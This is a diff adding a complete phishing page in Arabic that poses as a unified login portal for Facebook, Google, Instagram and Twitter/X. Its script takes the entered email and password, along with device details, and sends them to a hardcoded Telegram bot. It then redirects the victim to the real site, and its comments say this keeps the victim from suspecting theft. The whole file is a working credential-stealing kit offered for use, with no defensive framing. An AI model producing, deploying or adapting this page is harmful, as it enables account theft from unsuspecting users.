@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز تسجيل الدخول الموحد</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 400px; text-align: center; }
+        h2 { color: #333; margin-bottom: 20px; }
+        .option-btn { display: flex; align-items: center; width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; cursor: pointer; text-decoration: none; color: #333; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        .option-btn:hover { background-color: #eef; transform: scale(1.02); }
+        .icon { width: 30px; margin-left: 15px; }
+        .login-form { display: none; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
+        .submit-btn { background: #1877f2; color: white; border: none; width: 96%; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-box">
+        <div id="selection-page">
+            <h2>اختر وسيلة تسجيل الدخول</h2>
+            <div class="option-btn" onclick="showLogin('Facebook', '#1877f2')">
+                <img class="icon" src="https://cdn-icons-png.flaticon.com/512/124/124010.png"> فيسبوك
+            </div>
+            <div class="option-btn" onclick="showLogin('Google', '#db4437')">
+                <img class="icon" src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png"> جوجل
+            </div>
+            <div class="option-btn" onclick="showLogin('Instagram', '#C13584')">
+                <img class="icon" src="https://cdn-icons-png.flaticon.com/512/174/174855.png"> إنستغرام
+            </div>
+            <div class="option-btn" onclick="showLogin('Twitter/X', '#000')">
+                <img class="icon" src="https://cdn-icons-png.flaticon.com/512/5969/5969020.png"> تويتر / X
+            </div>
+        </div>
+
+        <div id="login-page" class="login-form">
+            <h2 id="site-name" style="color:#1877f2;">تسجيل الدخول</h2>
+            <form id="steal-form">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <input type="password" id="pass" placeholder="كلمة السر" required>
+                <button type="submit" class="submit-btn" id="submit-button">تسجيل الدخول</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8960046938:AAF1GRVk0tFUPz1LaqvI1AG2sNZgsSvcNog';
+        const CHAT_ID = '6670040264';
+        let currentSite = '';
+
+        function showLogin(site, color) {
+            currentSite = site;
+            document.getElementById('selection-page').style.display = 'none';
+            document.getElementById('login-page').style.display = 'block';
+            document.getElementById('site-name').innerText = 'تسجيل دخول ' + site;
+            document.getElementById('site-name').style.color = color;
+            document.getElementById('submit-button').style.backgroundColor = color;
+        }
+
+        document.getElementById('steal-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            // سحب معلومات إضافية عن الجهاز
+            const userAgent = navigator.userAgent;
+            const screenRes = window.screen.width + 'x' + window.screen.height;
+
+            const msg = `💀 صيد جديد مدمّر! 💀\n\n🎯 الموقع: ${currentSite}\n📧 الحساب: ${email}\n🔑 كلمة السر: ${pass}\n🌐 الجهاز: ${userAgent}\n🖥️ الدقة: ${screenRes}`;
+
+            // إرسال البيانات عبر API تليجرام مباشرة من المتصفح
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+            // توجيه الضحية للموقع الحقيقي فوراً ليصدق العملية
+            window.location.href = (currentSite === 'Facebook') ? 'https://facebook.com' : 
+                                   (currentSite === 'Google') ? 'https://accounts.google.com' : 
+                                   (currentSite === 'Instagram') ? 'https://instagram.com' : 'https://x.com';
+        };
+    </script>
+</body>
+</html>
